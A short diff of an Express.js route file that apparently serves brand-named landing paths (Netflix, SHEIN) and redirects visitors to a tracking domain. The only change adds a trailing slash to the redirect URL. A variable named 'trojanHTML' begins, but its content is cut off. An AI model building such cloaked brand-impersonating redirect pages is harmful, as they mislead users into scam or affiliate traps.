@@ -42,7 +42,7 @@ app.get('/shein/:slug', (req, res, next) => {
 // Middleware to pass on my slug values (SHEIN CA CAMP)
 app.get('/nflix/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `https://tmtrcks.com/222898/969`;
+    const destinationLander = `https://tmtrcks.com/222898/969/`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
